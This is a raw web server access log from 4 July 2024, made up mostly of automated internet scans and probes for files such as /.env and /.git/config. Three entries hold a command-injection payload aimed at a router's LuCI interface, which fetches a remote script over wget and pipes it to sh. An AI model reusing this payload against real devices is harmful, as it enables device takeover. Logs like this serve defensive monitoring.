172.105.128.13 - - [04/Jul/2024:10:01:36 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x19\x98|9\x11\xBAh\xE1\x88\xD9\x88\xF4\xD4\xC2\xDDD\xF7\x22\xCF\xDA\x09\x87\x229\xA4" 400 154 "-" "-"
46.174.191.31 - - [04/Jul/2024:10:01:45 +0000] "GET / HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
194.165.16.10 - - [04/Jul/2024:10:03:04 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
104.45.239.157 - - [04/Jul/2024:10:04:20 +0000] "MGLNDD_20.120.210.192_80" 400 154 "-" "-"
94.156.68.162 - - [04/Jul/2024:10:07:51 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
165.22.54.194 - - [04/Jul/2024:10:36:01 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 122 "-" "Mozilla/5.0"
165.22.54.194 - - [04/Jul/2024:10:36:52 +0000] "\x16\x03\x01\x01\x07\x01\x00\x01\x03\x03\x03\xE72\x8D\x0F\x16K6}\x9C\x89#\x00|\x91w<\xB8qG\xA2\xA6\xEC/\x1B\xE2\x1CE\xC4\xAA\xAF\x95\x22 x\xD4p*k\xE6]\xD5\x90\xCE\xF8\xAFSn\x1B\xEC\xF0G\x1F0\xB5Nc\xF5\x1BO\x99\xCD\xD7H\xC4\x82\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
141.98.83.197 - - [04/Jul/2024:10:40:43 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
44.225.174.208 - - [04/Jul/2024:10:43:46 +0000] "GET / HTTP/1.1" 404 150 "-" "WizDynamicScanner/1.0"
54.191.198.58 - - [04/Jul/2024:10:43:46 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36"
57.129.23.166 - - [04/Jul/2024:10:55:49 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [04/Jul/2024:10:55:49 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
31.220.1.83 - - [04/Jul/2024:11:11:23 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
34.76.96.55 - - [04/Jul/2024:11:12:55 +0000] "GET / HTTP/1.1" 404 122 "-" "python-requests/2.32.2"
83.78.57.228 - - [04/Jul/2024:11:36:04 +0000] "GET / HTTP/1.1" 404 122 "-" "python-requests/2.28.1"
31.220.1.83 - - [04/Jul/2024:11:46:16 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
57.129.23.166 - - [04/Jul/2024:11:50:20 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [04/Jul/2024:11:50:21 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.224.128.43 - - [04/Jul/2024:12:05:21 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.156.128.47 - - [04/Jul/2024:12:10:08 +0000] "GET /owncloud/status.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.156.128.47 - - [04/Jul/2024:12:10:08 +0000] "GET /status.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
141.98.83.197 - - [04/Jul/2024:12:46:44 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.242.226.10 - - [04/Jul/2024:12:48:38 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
65.49.20.68 - - [04/Jul/2024:12:56:28 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
65.49.20.68 - - [04/Jul/2024:12:57:44 +0000] "GET /webui/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
65.49.20.68 - - [04/Jul/2024:12:58:38 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36 OPR/80.0.4170.72"
65.49.20.68 - - [04/Jul/2024:12:59:07 +0000] "GET /geoserver/web/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
92.249.48.202 - - [04/Jul/2024:12:59:23 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.220.1.83 - - [04/Jul/2024:13:05:31 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
192.210.150.32 - - [04/Jul/2024:13:15:23 +0000] "GET /.git/config HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
